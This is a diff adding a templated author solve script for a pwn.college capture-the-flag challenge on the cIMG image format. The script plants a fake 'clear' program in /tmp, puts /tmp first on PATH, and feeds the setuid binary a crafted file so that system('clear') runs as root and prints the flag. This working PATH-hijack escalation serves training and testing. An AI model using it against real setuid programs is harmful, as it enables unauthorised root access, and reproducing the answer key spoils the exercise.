@@ -1,0 +1,42 @@
+{%- import "cimg_lib.j2" as lib -%}
+#!/usr/bin/env python3
+"""Author solve for cIMG "animate-unsafe": the FLUSH directive runs
+system("clear") after regaining privileges, so a PATH-planted "clear" runs as
+root. Point it at /flag."""
+import os
+import re
+import subprocess
+
+
+def pack(value, bits):
+    return int(value).to_bytes(bits // 8, "little")
+
+
+with open("/tmp/clear", "w") as handle:
+    handle.write("#!/bin/sh\ncat /flag\n")
+os.chmod("/tmp/clear", 0o755)
+
+FLUSH = pack({{ c.directives["FLUSH"] }}, 16)
+
+body = bytearray({{ c.magic | tojson }}.encode("latin1"))
+body += pack({{ c.version }}, {{ c.version_bitwidth }})
+body += bytes([1, 1])  # framebuffer width, height
+body += pack(1, {{ c.directives_bitwidth }})  # one directive follows
+body += FLUSH + bytes([1])  # flush with clear=1
+
+with open("/tmp/solve.cimg", "wb") as handle:
+    handle.write(body)
+
+env = dict(os.environ, PATH="/tmp:" + os.environ.get("PATH", ""))
+result = subprocess.run(
+    ["/challenge/cimg", "/tmp/solve.cimg"],
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    timeout=30,
+    env=env,
+)
+output = result.stdout.decode("latin1")
+print(output[-500:])
+match = re.search(r"pwn\.college\{[^}\n]+\}", output)
+assert match, f"flag not found (rc={result.returncode})"
+print(f"Flag: {match.group(0)}")
